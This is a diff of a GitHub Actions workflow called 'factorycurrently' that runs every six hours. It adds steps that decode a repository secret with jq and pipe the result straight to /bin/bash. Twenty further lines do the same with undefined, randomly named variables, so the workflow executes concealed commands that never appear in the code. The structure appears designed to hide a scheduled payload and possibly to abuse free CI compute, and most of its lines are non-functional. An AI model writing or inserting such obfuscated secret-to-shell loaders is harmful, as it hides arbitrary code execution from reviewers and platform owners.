@@ -1,28 +1,38 @@
 name: factorycurrently
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '34 5/6 * * *'
-
+    - cron: '2 3/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: factorycurrently
         env:
-          i33: ${{ secrets.i33 }}
+          srgf6: ${{ secrets.srgf6 }}
         run: |
-          echo $i33 | jq -r .gsvlb97349 | /bin/bash
-          echo $bv18994 | jq -r .uwt234 | /bin/bash
-          echo $njpny88 | jq -r .w99536 | /bin/bash
-          echo $dzzvo43364 | jq -r .pcfjk727 | /bin/bash
-          echo $uyi28016 | jq -r .yszqx67 | /bin/bash
-          echo $revy4 | jq -r .xcsj52590 | /bin/bash
-          echo $p72644 | jq -r .uimoh71772 | /bin/bash
-          echo $n4 | jq -r .w67 | /bin/bash
-          echo $xemb38 | jq -r .zsct3144 | /bin/bash
-          echo $lawjt06201 | jq -r .zghw5 | /bin/bash
-          echo $tgud7 | jq -r .cxfpy8 | /bin/bash
-          echo $bauh7013 | jq -r .axr255 | /bin/bash
+          echo $srgf6 | jq -r .jqzhf819 | /bin/bash
+          echo $rk9 | jq -r .cmysm9157 | /bin/bash
+          echo $eb5 | jq -r .ub19 | /bin/bash
+          echo $ailn08771 | jq -r .evf39 | /bin/bash
+          echo $ohokl9941 | jq -r .pal48752 | /bin/bash
+          echo $bd72368 | jq -r .alekj91 | /bin/bash
+          echo $y01 | jq -r .eanhj14 | /bin/bash
+          echo $mbwoy049 | jq -r .ah11 | /bin/bash
+          echo $voade9162 | jq -r .lj4 | /bin/bash
+          echo $ma28 | jq -r .g79 | /bin/bash
+          echo $ejc562 | jq -r .lt5 | /bin/bash
+          echo $rg21 | jq -r .iz07247 | /bin/bash
+          echo $lpg371 | jq -r .boso5 | /bin/bash
+          echo $x98523 | jq -r .j24 | /bin/bash
+          echo $f75 | jq -r .sbxiz932 | /bin/bash
+          echo $y60 | jq -r .flgne07 | /bin/bash
+          echo $rl72 | jq -r .whe5 | /bin/bash
+          echo $e171 | jq -r .qzx31134 | /bin/bash
+          echo $vf77320 | jq -r .l5801 | /bin/bash
+          echo $g4740 | jq -r .qm2 | /bin/bash
+          echo $lezyl3791 | jq -r .ppu9738 | /bin/bash
 
